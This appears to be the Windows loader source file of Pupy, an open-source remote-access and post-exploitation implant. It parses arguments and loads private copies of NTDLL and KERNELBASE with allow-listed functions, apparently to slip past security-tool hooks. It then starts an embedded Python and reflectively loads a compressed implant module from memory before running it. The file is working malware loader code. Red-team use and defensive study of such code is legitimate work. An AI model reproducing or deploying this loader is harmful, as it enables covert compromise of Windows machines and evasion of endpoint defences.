/*
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
*/

#include <windows.h>

#include "revision.h"
#include "pupy_load.h"
#include "debug.h"

#include "Python-dynload.c"

#ifdef _PUPY_DYNLOAD
#ifdef DEBUG
#include "_pupy_debug_pyd.c"
#define _pupy_pyd_c_start _pupy_debug_pyd_c_start
#define _pupy_pyd_c_size _pupy_debug_pyd_c_size
#else
#include "_pupy_pyd.c"
#endif
#endif

typedef LPWSTR* (*CommandLineToArgvW_t)(
    LPCWSTR lpCmdLine,
    int     *pNumArgs
);


#ifdef DEBUG
// Redirect early stdout to some file
static
void redirect_stdout() {
    FILE* new_log;
    char tmpdir[MAX_PATH];
    char tmp[MAX_PATH];

    dprint("Redirect stdout requested\n");

    if (!GetTempPathA(sizeof(tmpdir), tmpdir))
        return;

    dprint("Redirect stdout, tmpdir: %s\n", tmpdir);

    if (!GetTempFileNameA(
            tmpdir,
            "pup",
            0,
            tmp))
        return;

    set_debug_log(tmp);
}
#endif


// https://stackoverflow.com/questions/291424/
static
LPSTR* CommandLineToArgvA(INT *pNumArgs)
{
    LPWSTR cmdline;
    LPWSTR* args;
    LPSTR* result;
    LPSTR buffer;

    int retval;
    int numArgs;
    int storage;
    int bufLen;
    int i;

    static CommandLineToArgvW_t CommandLineToArgvW_ = NULL;

    if (!CommandLineToArgvW_) {
        HMODULE hShell32 = LoadLibrary("SHELL32.DLL");
        CommandLineToArgvW_ = (CommandLineToArgvW_t) GetProcAddress(
            hShell32, "CommandLineToArgvW");
        dprint("CommandLineToArgvW: %p\n", CommandLineToArgvW_);
    }

    if (!CommandLineToArgvW_) {
        dprint("Failed to load CommandLineToArgvW from SHELL32.DLL\n");
        *pNumArgs = 0;
        return NULL;
    }

    numArgs = 0;

    cmdline = GetCommandLineW();
    if (!cmdline) {
        dprint("Command line not found");
        *pNumArgs = 0;
        return NULL;
    }

    args = CommandLineToArgvW_(cmdline, &numArgs);
    if (args == NULL) {
        *pNumArgs = 0;
        return NULL;
    }

    storage = numArgs * sizeof(LPSTR);
    for (i = 0; i < numArgs; ++ i)
    {
        retval = WideCharToMultiByte(
            CP_UTF8, 0, args[i], -1, NULL,
            0, NULL, NULL
        );
        if (!SUCCEEDED(retval))
        {
            LocalFree(args);
            *pNumArgs = 0;
            return NULL;
        }

        storage += retval;
    }

    result = (LPSTR*)LocalAlloc(LMEM_FIXED, storage);
    if (result == NULL)
    {
        LocalFree(args);
        *pNumArgs = 0;
        return NULL;
    }

    bufLen = storage - (numArgs * sizeof(LPSTR));
    buffer = ((LPSTR)result) + (numArgs * sizeof(LPSTR));
    for (i = 0; i < numArgs; ++ i)
    {
        if (bufLen < 0) {
            dprint("Buflen exhaused, arg %d (%d/%d)\n", i, bufLen, storage);
            numArgs = i;
            break;
        }

        retval = WideCharToMultiByte(
            CP_UTF8, 0, args[i], -1, buffer,
            bufLen, NULL, NULL
        );

        if (!SUCCEEDED(retval))
        {
            LocalFree(result);
            LocalFree(args);
            *pNumArgs = i;
            return NULL;
        }

        result[i] = buffer;

        buffer += retval;
        bufLen -= retval;
    }

    LocalFree(args);

    *pNumArgs = numArgs;
    return result;
}

#ifdef _PUPY_PRIVATE_NT
static const PSTR NtDllAllowedPrefixes[] = {"Nt", NULL};
static const PSTR Kernel32AllowedPrefixes[] = {
    "CreateRemote", "CreateFile", "Delete", "Open",
    "Write", "Read", "Terminate", "Resume", "Virtual",
    "Reg", NULL
};

typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
LPFN_ISWOW64PROCESS fnIsWow64Process;

BOOL IsWow64()
{
#ifdef WIN_X86
    BOOL bIsWow64 = TRUE;

    //IsWow64Process is not available on all supported versions of Windows.
    //Use GetModuleHandle to get a handle to the DLL that contains the function
    //and GetProcAddress to get a pointer to the function if available.

    fnIsWow64Process = (LPFN_ISWOW64PROCESS) GetProcAddress(
        GetModuleHandle("kernel32"),"IsWow64Process");

    if(NULL != fnIsWow64Process)
        fnIsWow64Process(GetCurrentProcess(),&bIsWow64);

    return bIsWow64;
#else
    return FALSE;
#endif
}
#endif

void initialize(BOOL isDll, on_exit_session_t *cb) {
#ifdef _PUPY_PRIVATE_NT
    HMODULE hNtDll;
    HMODULE hKernelBase;
    HMODULE hKernel32;
#endif

    int i, argc = 0;
    char **argv = NULL;

#ifdef _PUPY_DYNLOAD
    _pupy_pyd_args_t args;
#endif

    dprint("TEMPLATE REV: %s\n", GIT_REVISION_HEAD);

#ifdef _PUPY_PRIVATE_NT
    if (IsWow64()) {
        dprint("WOW64 + _PUPY_PRIVATE_NT known to be broken right now\n");
    } else {
        hNtDll = GetModuleHandleA("NTDLL.DLL");
        hKernelBase = GetModuleHandleA("KERNELBASE.DLL");
        hKernel32 = GetModuleHandleA("KERNEL32.DLL");
    }

    if (hNtDll && hKernel32 && hKernelBase)  {
        HMODULE hPrivate;
        dprint("Loading private copy of NTDLL/KERNELBASE\n");

        hPrivate = MyLoadLibraryEx("NTDLL.DLL", hNtDll, NULL, TRUE);
        if (hPrivate) {
            dprint(
                "Private copy of NTDLL.DLL loaded to %p (orig: %p)\n",
                hPrivate, hNtDll
            );

            if (SetAliasedModule(hPrivate, NULL, NtDllAllowedPrefixes, NULL)) {
                dprint("Allow Nt prefixes for private NTDLL");
            }

            hPrivate = MyLoadLibraryEx("KERNEL32.DLL", hKernelBase, NULL, TRUE);
            if (hPrivate) {
                dprint(
                    "Private copy of KERNELBASE.DLL loaded to %p as KERNEL32 (orig: %p)\n",
                    hPrivate, hKernel32
                );

                if (SetAliasedModule(hPrivate, hKernel32, Kernel32AllowedPrefixes, NULL)) {
                    dprint("Set aliased module for KERNELBASE32.DLL to KERNEL32.DLL");
                }
            }
        }
    }
#endif

#ifdef DEBUG
    redirect_stdout();
#endif

    dprint("Parsing command line..\n");
    argv = CommandLineToArgvA(&argc);

    for (i=0; i<argc; i++) {
        dprint("ARGV: %d: %s\n", i, argv[i]);
    }

    dprint("Initializing python...\n");
    if (!initialize_python(argc, argv, isDll)) {
        return;
    }

#ifdef _PUPY_DYNLOAD
    dprint("_pupy built with dynload\n");

    args.pvMemoryLibraries = MyGetLibraries();
    args.cbExit = NULL;
    args.blInitialized = FALSE;

    dprint("Load _pupy\n");
    xz_dynload(
        "_pupy.pyd",
        _pupy_pyd_c_start, _pupy_pyd_c_size,
        &args
    );

    if (args.blInitialized != TRUE) {
        dprint("_pupy.pyd initialization failed\n");
        return;
    }

    dprint("cbExit: %p\n", args.cbExit);
    dprint("pvMemoryLibraries: %p\n", args.pvMemoryLibraries);

    if (cb) {
        *cb = args.cbExit;
    }
#else
    init_pupy();
    if (cb) {
        *cb = on_exit_session;
    }
#endif

    return;
}

void deinitialize() {
    deinitialize_python();
}

DWORD WINAPI execute(LPVOID lpArg)
{
    // no lpArg means shared object
    dprint("Running pupy...\n");
    run_pupy();
    dprint("Global Exit\n");
    return 0;
}
